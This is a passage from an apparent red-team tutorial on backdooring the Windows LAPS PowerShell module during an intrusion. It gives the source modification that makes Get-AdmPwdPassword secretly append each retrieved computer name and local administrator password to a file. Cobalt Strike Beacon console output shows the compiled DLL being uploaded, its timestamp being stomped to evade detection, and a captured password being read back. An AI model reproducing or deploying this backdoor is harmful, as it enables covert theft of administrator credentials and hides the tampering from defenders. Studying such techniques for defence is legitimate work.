The PowerShell cmdlets for LAPS can be found in `C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS`.

```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 17:09:59   en-US
 30kb     fil     09/23/2016 00:38:16   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```
  
The original source code for LAPS can be found [here](https://github.com/GreyCorbel/admpwd) - we can compile a new copy of the DLL with some hidden backdoors. In this example, we backdoor the `Get-AdmPwdPassword` method to write the password to a file, so that when an admin legitimately gets a password, we can have a copy.

The original method is very simple (located in `Main/AdmPwd.PS/Main.cs`):

```powershell
[Cmdlet("Get", "AdmPwdPassword")]
public class GetPassword : Cmdlet
{
    [Parameter(Mandatory = true, Position = 0, ValueFromPipeline = true)]
    public String ComputerName;

    protected override void ProcessRecord()
    {
        foreach (string dn in DirectoryUtils.GetComputerDN(ComputerName))
        {
            PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);
            WriteObject(pi);
        }
    }
}
```

We can add a simple line to append the computer name and password to a file.

```powershell
PasswordInfo pi = DirectoryUtils.GetPasswordInfo(dn);

var line = $"{pi.ComputerName} : {pi.Password}";
System.IO.File.AppendAllText(@"C:\Temp\LAPS.txt", line);

WriteObject(pi);
```

Compile the project and upload `AdmPwd.PS.dll` to the machine.

```
beacon> upload C:\Tools\admpwd\Main\AdmPwd.PS\bin\Debug\AdmPwd.PS.dll
```
  

Replacing the original file has changed the **Last Modified** timestamp for `AdmPwd.PS.dll`.

```
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 17:09:59   en-US
 15kb     fil     03/16/2021 18:43:43   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```

Use Beacon's `timestomp` command to "clone" the timestamp of `AdmPwd.PS.psd1` and apply it to `AdmPwd.PS.dll`.

```
beacon> timestomp AdmPwd.PS.dll AdmPwd.PS.psd1
beacon> ls
[*] Listing: C:\Windows\System32\WindowsPowerShell\v1.0\Modules\AdmPwd.PS\

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     03/16/2021 17:09:59   en-US
 15kb     fil     08/23/2016 14:40:58   AdmPwd.PS.dll
 5kb      fil     08/23/2016 14:40:58   AdmPwd.PS.format.ps1xml
 4kb      fil     08/23/2016 14:40:58   AdmPwd.PS.psd1
 33kb     fil     09/22/2016 08:02:08   AdmPwd.Utils.dll
```

Go ahead and run `Get-AdmPwdPassword` and then check `C:\Temp`.

```
beacon> ls C:\Temp

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
 24b      fil     03/16/2021 18:48:13   LAPS.txt

beacon> shell type C:\Temp\LAPS.txt
WKSTN-2 : P0OPwa4R64AkbJ
```

There are clearly more subtle ways to go about this, and dropping to a text file in `C:\` is not the best strategy. But since we have access to source code, we can do anything we want.